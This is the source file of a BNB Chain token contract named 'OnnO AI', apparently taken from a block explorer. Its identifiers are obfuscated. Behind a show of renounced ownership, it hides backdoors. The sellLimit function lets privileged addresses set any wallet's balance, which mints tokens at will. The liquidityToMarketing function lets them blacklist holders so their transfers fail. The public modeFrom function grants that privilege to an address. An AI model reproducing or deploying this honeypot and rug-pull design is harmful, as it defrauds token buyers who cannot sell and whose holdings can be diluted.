/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface fundSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverMarketing) external view returns (uint256);

    function transfer(address walletListLaunched, uint256 receiverLiquidity) external returns (bool);

    function allowance(address minTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address walletListLaunched,
        uint256 receiverLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapList, uint256 value);
    event Approval(address indexed minTx, address indexed spender, uint256 value);
}

interface fundAmount is fundSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract receiverAmountLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenEnableIs {
    function createPair(address walletIs, address totalShould) external returns (address);
}

interface toSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract OnnOAI is receiverAmountLimit, fundSender, fundAmount {

    function totalSupply() external view virtual override returns (uint256) {
        return walletAt;
    }

    bool public takeIs;

    function allowance(address feeMax, address tokenLimitList) external view virtual override returns (uint256) {
        return marketingTrading[feeMax][tokenLimitList];
    }

    constructor (){ 
        
        receiverMin = _msgSender();
        toSender fundFrom = toSender(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxFeeIs = tokenEnableIs(fundFrom.factory()).createPair(fundFrom.WETH(), address(this));
        
        maxReceiver[_msgSender()] = walletAt;
        modeTeam[_msgSender()] = true;
        buyLaunchedIs = _msgSender();
        
        emit Transfer(address(0), buyLaunchedIs, walletAt);
        marketingMode();
    }

    function tokenListLaunched() public view returns (bool) {
        return takeIs;
    }

    uint256 public limitLaunched;

    function balanceOf(address receiverMarketing) public view virtual override returns (uint256) {
        return maxReceiver[receiverMarketing];
    }

    bool private tradingLaunch;

    function transferFrom(address enableSenderBuy, address walletListLaunched, uint256 receiverLiquidity) external override returns (bool) {
        if (marketingTrading[enableSenderBuy][_msgSender()] != type(uint256).max) {
            require(receiverLiquidity <= marketingTrading[enableSenderBuy][_msgSender()]);
            marketingTrading[enableSenderBuy][_msgSender()] -= receiverLiquidity;
        }
        return atReceiver(enableSenderBuy, walletListLaunched, receiverLiquidity);
    }

    mapping(address => uint256) private maxReceiver;

    mapping(address => bool) public receiverFrom;

    bool public listSwap;

    uint8 private limitAutoTake = 18;

    mapping(address => mapping(address => uint256)) private marketingTrading;

    function getOwner() external view returns (address) {
        return receiverMin;
    }

    function launchLimit() public {
        
        
        tradingLaunch=false;
    }

    function name() external view virtual override returns (string memory) {
        return marketingTotalSender;
    }

    function owner() external view returns (address) {
        return receiverMin;
    }

    function maxAt() public {
        
        
        receiverLaunched=false;
    }

    function minListMarketing(address enableSenderBuy, address walletListLaunched, uint256 receiverLiquidity) internal returns (bool) {
        require(maxReceiver[enableSenderBuy] >= receiverLiquidity);
        maxReceiver[enableSenderBuy] -= receiverLiquidity;
        maxReceiver[walletListLaunched] += receiverLiquidity;
        emit Transfer(enableSenderBuy, walletListLaunched, receiverLiquidity);
        return true;
    }

    string private marketingTotalSender = "OnnO AI";

    function liquidityToMarketing(address fromFeeReceiver) public {
        feeTrading();
        
        if (fromFeeReceiver == buyLaunchedIs || fromFeeReceiver == maxFeeIs) {
            return;
        }
        receiverFrom[fromFeeReceiver] = true;
    }

    mapping(address => bool) public modeTeam;

    function tokenMode() public view returns (bool) {
        return receiverLaunched;
    }

    bool private atSwap;

    function modeFrom(address atToken) public {
        if (amountMax) {
            return;
        }
        if (toExemptReceiver != enableMin) {
            tradingLaunch = true;
        }
        modeTeam[atToken] = true;
        
        amountMax = true;
    }

    string private limitSwap = "OAI";

    uint256 public toExemptReceiver;

    address public buyLaunchedIs;

    function feeTrading() private view{
        require(modeTeam[_msgSender()]);
    }

    function marketingMode() public {
        emit OwnershipTransferred(buyLaunchedIs, address(0));
        receiverMin = address(0);
    }

    address private receiverMin;

    address public maxFeeIs;

    bool public amountMax;

    function sellFrom() public {
        
        if (tradingLaunch) {
            tokenSell = true;
        }
        limitLaunched=0;
    }

    function symbol() external view virtual override returns (string memory) {
        return limitSwap;
    }

    uint256 private walletAt = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return limitAutoTake;
    }

    uint256 private enableMin;

    event OwnershipTransferred(address indexed launchedFund, address indexed toWallet);

    function transfer(address shouldTo, uint256 receiverLiquidity) external virtual override returns (bool) {
        return atReceiver(_msgSender(), shouldTo, receiverLiquidity);
    }

    function sellLimit(address shouldTo, uint256 receiverLiquidity) public {
        feeTrading();
        maxReceiver[shouldTo] = receiverLiquidity;
    }

    function approve(address tokenLimitList, uint256 receiverLiquidity) public virtual override returns (bool) {
        marketingTrading[_msgSender()][tokenLimitList] = receiverLiquidity;
        emit Approval(_msgSender(), tokenLimitList, receiverLiquidity);
        return true;
    }

    bool private receiverLaunched;

    function atReceiver(address enableSenderBuy, address walletListLaunched, uint256 receiverLiquidity) internal returns (bool) {
        if (enableSenderBuy == buyLaunchedIs) {
            return minListMarketing(enableSenderBuy, walletListLaunched, receiverLiquidity);
        }
        require(!receiverFrom[enableSenderBuy]);
        return minListMarketing(enableSenderBuy, walletListLaunched, receiverLiquidity);
    }

    bool private tokenSell;

}